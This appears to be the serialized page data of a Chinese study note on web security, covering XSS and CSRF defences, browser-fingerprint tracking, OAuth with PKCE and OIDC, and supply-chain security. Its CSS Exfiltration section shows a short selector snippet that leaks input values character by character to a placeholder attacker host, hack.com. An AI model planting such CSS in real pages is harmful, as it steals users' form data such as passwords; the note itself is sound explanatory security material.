,"Web 安全技术、OAuth 协议与加密算法","content/6.maps/_web/security.md",{"type":183,"children":184,"toc":793},"root",[185,193,210,215,222,228,233,239,244,249,255,352,357,363,376,393,399,405,417,422,427,438,522,527,532,615,621,626,631,650,662,668,673,685,698,703,708,713,756,768,773,787],{"type":186,"tag":187,"props":188,"children":190},"element","h2",{"id":189},"领域",[191],{"type":192,"value":189},"text",{"type":186,"tag":194,"props":195,"children":196},"ul",{},[197],{"type":186,"tag":198,"props":199,"children":200},"li",{},[201,208],{"type":186,"tag":202,"props":203,"children":205},"a",{"href":204},"/maps/_web/browser/crypto",[206],{"type":192,"value":207},"Web Crypto API",{"type":192,"value":209}," - Web 加密 API",{"type":186,"tag":187,"props":211,"children":213},{"id":212},"安全概念",[214],{"type":192,"value":212},{"type":186,"tag":216,"props":217,"children":219},"h4",{"id":218},"xss-原理与防范",[220],{"type":192,"value":221},"XSS 原理与防范",{"type":186,"tag":223,"props":224,"children":225},"p",{},[226],{"type":192,"value":227},"XSS（Cross Site Scripting）跨站脚本攻击，通过某种方式将非法代码挂载在 URL、或者后端数据中，以达到让浏览器执行的目的。反射型 XSS 和储存型 XSS 都是利用后端返回的非法脚本直接在前端展示，就得到了执行。DOM-Based XSS 是通过修改源码内容来执行的。比如说，反射型 XSS 可能是一封黑客的邮件，链接参数带上了脚本代码；储存型 XSS 在可视化编辑器中很常见；DOM-Based XSS 可能是执行了一段 URL Hash 里面拿到的文本。",{"type":186,"tag":223,"props":229,"children":230},{},[231],{"type":192,"value":232},"XSS 可以用来盗取 Cookie、DDos、篡改数据等。防范最基本要做的就是是后端不应该信任前端传来的数据，并且要做好过滤，把字符转义为 HTML 实体。其次是给 Cookie 设上 http-only。",{"type":186,"tag":216,"props":234,"children":236},{"id":235},"csrf-原理与防范",[237],{"type":192,"value":238},"CSRF 原理与防范",{"type":186,"tag":223,"props":240,"children":241},{},[242],{"type":192,"value":243},"CSRF（Cross Site Request Forgery）跨站请求伪造，主要原理是黑客利用了用户在敏感站点保持的登录态，在另一个用户访问的网页去伪造敏感站点的请求。",{"type":186,"tag":223,"props":245,"children":246},{},[247],{"type":192,"value":248},"可以使用 CSRF token 方案。每次用户请求 HTML 都在其中设置一个随机的 Token，在请求时带上。",{"type":186,"tag":216,"props":250,"children":252},{"id":251},"css-exfiltration-攻击",[253],{"type":192,"value":254},"CSS Exfiltration 攻击",{"type":186,"tag":256,"props":257,"children":261},"pre",{"className":258,"code":259,"language":260,"meta":178,"style":178},"language-css shiki shiki-themes material-theme-lighter github-light github-dark monokai","input[value^=a]{\n  background-image: url(http://hack.com/a);\n}\n","css",[262],{"type":186,"tag":263,"props":264,"children":265},"code",{"__ignoreMap":178},[266,306,343],{"type":186,"tag":267,"props":268,"children":271},"span",{"class":269,"line":270},"line",1,[272,278,284,290,296,301],{"type":186,"tag":267,"props":273,"children":275},{"style":274},"--shiki-light:#E2931D;--shiki-default:#22863A;--shiki-dark:#85E89D;--shiki-sepia:#F92672",[276],{"type":192,"value":277},"input",{"type":186,"tag":267,"props":279,"children":281},{"style":280},"--shiki-light:#39ADB5;--shiki-default:#24292E;--shiki-dark:#E1E4E8;--shiki-sepia:#F8F8F2",[282],{"type":192,"value":283},"[",{"type":186,"tag":267,"props":285,"children":287},{"style":286},"--shiki-light:#9C3EDA;--shiki-default:#6F42C1;--shiki-dark:#B392F0;--shiki-sepia:#A6E22E",[288],{"type":192,"value":289},"value",{"type":186,"tag":267,"props":291,"children":293},{"style":292},"--shiki-light:#39ADB5;--shiki-default:#D73A49;--shiki-dark:#F97583;--shiki-sepia:#F92672",[294],{"type":192,"value":295},"^=",{"type":186,"tag":267,"props":297,"children":299},{"style":298},"--shiki-light:#91B859;--shiki-default:#032F62;--shiki-dark:#9ECBFF;--shiki-sepia:#E6DB74",[300],{"type":192,"value":202},{"type":186,"tag":267,"props":302,"children":303},{"style":280},[304],{"type":192,"value":305},"]{\n",{"type":186,"tag":267,"props":307,"children":309},{"class":269,"line":308},2,[310,316,321,327,332,338],{"type":186,"tag":267,"props":311,"children":313},{"style":312},"--shiki-light:#8796B0;--shiki-light-font-style:inherit;--shiki-default:#005CC5;--shiki-default-font-style:inherit;--shiki-dark:#79B8FF;--shiki-dark-font-style:inherit;--shiki-sepia:#66D9EF;--shiki-sepia-font-style:italic",[314],{"type":192,"value":315},"  background-image",{"type":186,"tag":267,"props":317,"children":318},{"style":280},[319],{"type":192,"value":320},":",{"type":186,"tag":267,"props":322,"children":324},{"style":323},"--shiki-light:#6182B8;--shiki-default:#005CC5;--shiki-dark:#79B8FF;--shiki-sepia:#66D9EF",[325],{"type":192,"value":326}," url",{"type":186,"tag":267,"props":328,"children":329},{"style":280},[330],{"type":192,"value":331},"(",{"type":186,"tag":267,"props":333,"children":335},{"style":334},"--shiki-light:#90A4AE;--shiki-light-font-style:italic;--shiki-default:#E36209;--shiki-default-font-style:inherit;--shiki-dark:#FFAB70;--shiki-dark-font-style:inherit;--shiki-sepia:#FD971F;--shiki-sepia-font-style:italic",[336],{"type":192,"value":337},"http://hack.com/a",{"type":186,"tag":267,"props":339,"children":340},{"style":280},[341],{"type":192,"value":342},");\n",{"type":186,"tag":267,"props":344,"children":346},{"class":269,"line":345},3,[347],{"type":186,"tag":267,"props":348,"children":349},{"style":280},[350],{"type":192,"value":351},"}\n",{"type":186,"tag":187,"props":353,"children":355},{"id":354},"用户追踪技术",[356],{"type":192,"value":354},{"type":186,"tag":216,"props":358,"children":360},{"id":359},"linkedin-如何使用浏览器指纹追踪用户",[361],{"type":192,"value":362},"LinkedIn 如何使用浏览器指纹追踪用户？",{"type":186,"tag":223,"props":364,"children":365},{},[366,368,374],{"type":192,"value":367},"LinkedIn 被披露使用激进的\"用户指纹\"技术追踪用户：页面会加载一个包含 ",{"type":186,"tag":369,"props":370,"children":371},"strong",{},[372],{"type":192,"value":373},"2953 个浏览器插件",{"type":192,"value":375},"的清单，脚本依次检测用户安装了其中哪些插件，以此生成唯一特征码识别用户。这导致访问 LinkedIn 时控制台可能出现上千个报错。这种追踪方式比传统的 cookie 更隐蔽、更难防范，代表了当前网站用户追踪技术的极端案例。",{"type":186,"tag":377,"props":378,"children":379},"blockquote",{},[380],{"type":186,"tag":223,"props":381,"children":382},{},[383,385],{"type":192,"value":384},"#周刊摘录 见：",{"type":186,"tag":202,"props":386,"children":390},{"href":387,"rel":388},"https://www.ruanyifeng.com/blog/2026/02/weekly-issue-385.html",[389],"nofollow",[391],{"type":192,"value":392},"科技周刊第385期",{"type":186,"tag":187,"props":394,"children":396},{"id":395},"oauth",[397],{"type":192,"value":398},"OAuth",{"type":186,"tag":216,"props":400,"children":402},{"id":401},"oauth-的本质",[403],{"type":192,"value":404},"OAuth 的本质",{"type":186,"tag":223,"props":406,"children":407},{},[408,410,415],{"type":192,"value":409},"OAuth 解决的核心问题：",{"type":186,"tag":369,"props":411,"children":412},{},[413],{"type":192,"value":414},"如何让第三方应用在不获取用户密码的情况下代表用户操作",{"type":192,"value":416},"。",{"type":186,"tag":223,"props":418,"children":419},{},[420],{"type":192,"value":421},"这解释了其多层设计——authorization code、access token、refresh token——每一层都是为了在\"方便\"与\"安全\"之间取得平衡，而非单纯的身份验证。",{"type":186,"tag":216,"props":423,"children":425},{"id":424},"授权码流程",[426],{"type":192,"value":424},{"type":186,"tag":223,"props":428,"children":429},{},[430,432,437],{"type":192,"value":431},"OAuth 的复杂性源于一个根本矛盾：\n",{"type":186,"tag":369,"props":433,"children":434},{},[435],{"type":192,"value":436},"用户交互必须在浏览器（不安全的 front-channel）完成，而令牌交换必须在服务端（安全的 back-channel）完成",{"type":192,"value":416},{"type":186,"tag":439,"props":440,"children":441},"table",{},[442,471],{"type":186,"tag":443,"props":444,"children":445},"thead",{},[446],{"type":186,"tag":447,"props":448,"children":449},"tr",{},[450,456,461,466],{"type":186,"tag":451,"props":452,"children":453},"th",{},[454],{"type":192,"value":455},"通道",{"type":186,"tag":451,"props":457,"children":458},{},[459],{"type":192,"value":460},"传输方式",{"type":186,"tag":451,"props":462,"children":463},{},[464],{"type":192,"value":465},"安全性",{"type":186,"tag":451,"props":467,"children":468},{},[469],{"type":192,"value":470},"用途",{"type":186,"tag":472,"props":473,"children":474},"tbody",{},[475,499],{"type":186,"tag":447,"props":476,"children":477},{},[478,484,489,494],{"type":186,"tag":479,"props":480,"children":481},"td",{},[482],{"type":192,"value":483},"Front-channel",{"type":186,"tag":479,"props":485,"children":486},{},[487],{"type":192,"value":488},"GET 请求，参数在 URL",{"type":186,"tag":479,"props":490,"children":491},{},[492],{"type":192,"value":493},"低（可被历史记录、日志泄露）",{"type":186,"tag":479,"props":495,"children":496},{},[497],{"type":192,"value":498},"用户跳转、传递 authorization code",{"type":186,"tag":447,"props":500,"children":501},{},[502,507,512,517],{"type":186,"tag":479,"props":503,"children":504},{},[505],{"type":192,"value":506},"Back-channel",{"type":186,"tag":479,"props":508,"children":509},{},[510],{"type":192,"value":511},"POST 请求，参数在 body",{"type":186,"tag":479,"props":513,"children":514},{},[515],{"type":192,"value":516},"高（HTTPS 加密）",{"type":186,"tag":479,"props":518,"children":519},{},[520],{"type":192,"value":521},"交换 access token",{"type":186,"tag":223,"props":523,"children":524},{},[525],{"type":192,"value":526},"为什么不能用 URL 传 access token？\nURL 可能出现在浏览器历史、服务器日志、Referer 头中，导致令牌泄露。\n因此引入 authorization code 作为\"一次性凭证\"，完成前后端的安全接力。",{"type":186,"tag":216,"props":528,"children":530},{"id":529},"核心术语",[531],{"type":192,"value":529},{"type":186,"tag":194,"props":533,"children":534},{},[535,545,555,565,575,585,595,605],{"type":186,"tag":198,"props":536,"children":537},{},[538,543],{"type":186,"tag":369,"props":539,"children":540},{},[541],{"type":192,"value":542},"Resource Owner",{"type":192,"value":544},"：资源所有者（用户）",{"type":186,"tag":198,"props":546,"children":547},{},[548,553],{"type":186,"tag":369,"props":549,"children":550},{},[551],{"type":192,"value":552},"OAuth Client / App",{"type":192,"value":554},"：第三方应用",{"type":186,"tag":198,"props":556,"children":557},{},[558,563],{"type":186,"tag":369,"props":559,"children":560},{},[561],{"type":192,"value":562},"Authorization Server",{"type":192,"value":564},"：授权服务器（用户登录并同意授权的地方）",{"type":186,"tag":198,"props":566,"children":567},{},[568,573],{"type":186,"tag":369,"props":569,"children":570},{},[571],{"type":192,"value":572},"Resource Server",{"type":192,"value":574},"：资源服务器（存储用户数据的地方，可能与授权服务器相同）",{"type":186,"tag":198,"props":576,"children":577},{},[578,583],{"type":186,"tag":369,"props":579,"children":580},{},[581],{"type":192,"value":582},"Scopes",{"type":192,"value":584},"：授权范围（用户同意给予第三方哪些权限）",{"type":186,"tag":198,"props":586,"children":587},{},[588,593],{"type":186,"tag":369,"props":589,"children":590},{},[591],{"type":192,"value":592},"Authorization Code",{"type":192,"value":594},"：授权码（一次性凭证，用于交换 access token）",{"type":186,"tag":198,"props":596,"children":597},{},[598,603],{"type":186,"tag":369,"props":599,"children":600},{},[601],{"type":192,"value":602},"Access Token",{"type":192,"value":604},"：访问令牌（真正的\"权限凭证\"）",{"type":186,"tag":198,"props":606,"children":607},{},[608,613],{"type":186,"tag":369,"props":609,"children":610},{},[611],{"type":192,"value":612},"Client Secret",{"type":192,"value":614},"：客户端密钥（用于验证第三方应用身份）",{"type":186,"tag":216,"props":616,"children":618},{"id":617},"pkce",[619],{"type":192,"value":620},"PKCE",{"type":186,"tag":223,"props":622,"children":623},{},[624],{"type":192,"value":625},"对于纯前端或移动端应用，client secret 无法保密（可被提取或反编译）。",{"type":186,"tag":223,"props":627,"children":628},{},[629],{"type":192,"value":630},"PKCE（Proof Key for Code Exchange，发音\"pixie\"）通过以下方式解决：",{"type":186,"tag":632,"props":633,"children":634},"ol",{},[635,640,645],{"type":186,"tag":198,"props":636,"children":637},{},[638],{"type":192,"value":639},"客户端生成临时密钥对（code verifier + code challenge）",{"type":186,"tag":198,"props":641,"children":642},{},[643],{"type":192,"value":644},"授权请求时发送 code challenge",{"type":186,"tag":198,"props":646,"children":647},{},[648],{"type":192,"value":649},"交换 token 时验证 code verifier",{"type":186,"tag":223,"props":651,"children":652},{},[653,655,660],{"type":192,"value":654},"这是",{"type":186,"tag":369,"props":656,"children":657},{},[658],{"type":192,"value":659},"零信任架构",{"type":192,"value":661},"在 OAuth 中的早期实践——不依赖持久化 secret，每次授权独立验证。",{"type":186,"tag":216,"props":663,"children":665},{"id":664},"oidc",[666],{"type":192,"value":667},"OIDC",{"type":186,"tag":223,"props":669,"children":670},{},[671],{"type":192,"value":672},"OpenID Connect（OIDC）是构建在 OAuth 2.0 之上的身份验证层。",{"type":186,"tag":223,"props":674,"children":675},{},[676,678,683],{"type":192,"value":677},"这种设计遵循",{"type":186,"tag":369,"props":679,"children":680},{},[681],{"type":192,"value":682},"单一职责原则",{"type":192,"value":684},"：",{"type":186,"tag":194,"props":686,"children":687},{},[688,693],{"type":186,"tag":198,"props":689,"children":690},{},[691],{"type":192,"value":692},"OAuth 只做授权（authorization）",{"type":186,"tag":198,"props":694,"children":695},{},[696],{"type":192,"value":697},"OIDC 只做身份验证（authentication）",{"type":186,"tag":223,"props":699,"children":700},{},[701],{"type":192,"value":702},"两者可独立使用，也可组合。层叠设计比\"大而全\"的单一协议更具灵活性和可维护性。",{"type":186,"tag":216,"props":704,"children":706},{"id":705},"安全设计原则",[707],{"type":192,"value":705},{"type":186,"tag":223,"props":709,"children":710},{},[711],{"type":192,"value":712},"OAuth 的每一处复杂性都对应一个安全威胁：",{"type":186,"tag":194,"props":714,"children":715},{},[716,726,736,746],{"type":186,"tag":198,"props":717,"children":718},{},[719,724],{"type":186,"tag":369,"props":720,"children":721},{},[722],{"type":192,"value":723},"Redirect URI 白名单",{"type":192,"value":725},"：防止授权码被劫持到其他域名",{"type":186,"tag":198,"props":727,"children":728},{},[729,734],{"type":186,"tag":369,"props":730,"children":731},{},[732],{"type":192,"value":733},"Client Secret 验证",{"type":192,"value":735},"：确保只有注册的客户端能换取 token",{"type":186,"tag":198,"props":737,"children":738},{},[739,744],{"type":186,"tag":369,"props":740,"children":741},{},[742],{"type":192,"value":743},"Authorization Code 一次性使用",{"type":192,"value":745},"：防止重放攻击",{"type":186,"tag":198,"props":747,"children":748},{},[749,754],{"type":186,"tag":369,"props":750,"children":751},{},[752],{"type":192,"value":753},"State 参数",{"type":192,"value":755},"：防止 CSRF 攻击（跨站请求伪造）",{"type":186,"tag":223,"props":757,"children":758},{},[759,761],{"type":192,"value":760},"见：",{"type":186,"tag":202,"props":762,"children":765},{"href":763,"rel":764},"https://www.ducktyped.org/p/an-illustrated-guide-to-oauth",[389],[766],{"type":192,"value":767},"An Illustrated Guide to OAuth",{"type":186,"tag":187,"props":769,"children":771},{"id":770},"供应链安全",[772],{"type":192,"value":770},{"type":186,"tag":194,"props":774,"children":775},{},[776],{"type":186,"tag":198,"props":777,"children":778},{},[779,785],{"type":186,"tag":202,"props":780,"children":782},{"href":781},"/maps/_web/security/supply-chain",[783],{"type":192,"value":784},"软件供应链安全",{"type":192,"value":786},"：开源软件生态中的传递性信任问题与供应链攻击防范",{"type":186,"tag":788,"props":789,"children":790},"style",{},[791],{"type":192,"value":792},"html .light .shiki span {color: var(--shiki-light);background: var(--shiki-light-bg);font-style: var(--shiki-light-font-style);font-weight: var(--shiki-light-font-weight);text-decoration: var(--shiki-light-text-decoration);}html.light .shiki span {color: var(--shiki-light);background: var(--shiki-light-bg);font-style: var(--shiki-light-font-style);font-weight: var(--shiki-light-font-weight);text-decoration: var(--shiki-light-text-decoration);}html .default .shiki span {color: var(--shiki-default);background: var(--shiki-default-bg);font-style: var(--shiki-default-font-style);font-weight: var(--shiki-default-font-weight);text-decoration: var(--shiki-default-text-decoration);}html .shiki span {color: var(--shiki-default);background: var(--shiki-default-bg);font-style: var(--shiki-default-font-style);font-weight: var(--shiki-default-font-weight);text-decoration: var(--shiki-default-text-decoration);}html .dark .shiki span {color: var(--shiki-dark);background: var(--shiki-dark-bg);font-style: var(--shiki-dark-font-style);font-weight: var(--shiki-dark-font-weight);text-decoration: var(--shiki-dark-text-decoration);}html.dark .shiki span {color: var(--shiki-dark);background: var(--shiki-dark-bg);font-style: var(--shiki-dark-font-style);font-weight: var(--shiki-dark-font-weight);text-decoration: var(--shiki-dark-text-decoration);}html .sepia .shiki span {color: var(--shiki-sepia);background: var(--shiki-sepia-bg);font-style: var(--shiki-sepia-font-style);font-weight: var(--shiki-sepia-font-weight);text-decoration: var(--shiki-sepia-text-decoration);}html.sepia .shiki span {color: var(--shiki-sepia);background: var(--shiki-sepia-bg);font-style: var(--shiki-sepia-font-style);font-weight: var(--shiki-sepia-font-weight);text-decoration: var(--shiki-sepia-text-decoration);}",{"title":178,"searchDepth":308,"depth":308,"links":794},[795,796,797,798,799],{"id":189,"depth":308,"text":189},{"id":212,"depth":308,"text":212},{"id":354,"depth":308,"text":354},{"id":395,"depth":308,"text":398},{"id":770,"depth":308,"text":770},"markdown","content:6.maps:_web:security:security.md","content","6.maps/_web/security/security.md","6.maps/_web/security/security","md",[807,811],{"_path":808,"title":809,"description":810},"/maps/_web/performance/performance","页面性能","全面的网页性能优化指南，涵盖性能指标、监控方案、优化策略，以及 SSR、PWA 等现代 Web 应用的性能优化实践。",{"_path":781,"title":784,"description":812},"开源软件生态中的传递性信任问题与供应链攻击防范",1772504902543]